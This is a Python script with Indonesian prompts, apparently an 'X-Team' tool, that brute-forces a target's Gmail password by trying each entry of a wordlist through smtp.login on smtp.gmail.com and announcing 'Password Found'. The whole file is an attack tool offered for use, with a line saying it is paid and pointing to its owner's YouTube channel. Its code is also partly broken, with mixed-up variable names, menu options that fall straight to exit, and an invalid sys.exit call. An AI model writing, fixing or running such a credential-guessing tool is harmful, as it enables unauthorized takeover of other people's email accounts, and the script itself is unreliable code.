import smtplib, sys, os, random
from os import system

OKGREEN = '\033[92m'
WARNING = '\033[0;33m'
FAIL = '\033[91m'
ENDC = '\033[0m'
LITBU = '\033[94m'
YELLOW = '\033[3;33m'
CYAN = '\033[0;36'
colors = ['\033[92m', '\033[91m', '\033[0;33m']
RAND = random.choice(colors)

GMAIL_PORT = '587' 

def artwork():
    print("\n")
    print(RAND + '''
╔═╗╔═╗────────────╔════╗────╔╗
╚╗╚╝╔╝────────────║╔╗╔╗║────║║
─╚╗╔╝╔══╦╗╔╦╦══╦═╗╚╝║║╠╩═╦══╣║╔══╗
─╔╝╚╗║╔╗║╚╝╠╣╔╗║╔╝──║║║╔╗║╔╗║║║══╣
╔╝╔╗╚╣╔╗╠╗╔╣║╚╝║║───║║║╚╝║╚╝║╚╬══║
╚═╝╚═╩╝╚╝╚╝╚╩══╩╝───╚╝╚══╩══╩═╩══╝   
''')
artwork()
smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)


smtp.ehlo()
smtp.starttls()

user = input("EMAIL TARGET: ")
pwd = input("Enter '0' Untuk mendapatkan Password Email\nEnter '1' Untuk Membuat Password Kostum\nEnter '2' Untuk Cek limit Akun X-Team kamu\nEnter '3' Untuk Membuat Limit Akun X-Team\nOptions: ")

if pwd=='3':
    passwfile="xteam.txt" 
    
elif pwd=='2':
    print("\n") 
    passwfile = input("Username/ID X-Team (Akun X-Team):") 
    
if pwd=='0':
    passswfile="pass.txt"

elif pwd=='1':
    print("\n")
    passswfile = input("Password Costum (Kostumisasi Password):")

else:
    print("\n")
    print("Tools ini berbayar, silahkan hubungi owner Tools melalui Channel YouTube XAVIOR13...")
    sys.exit(1, 2)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1, 2)

for password in passswfile:
    try:
        smtp.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Apikey error is the Limits. %s " % password)
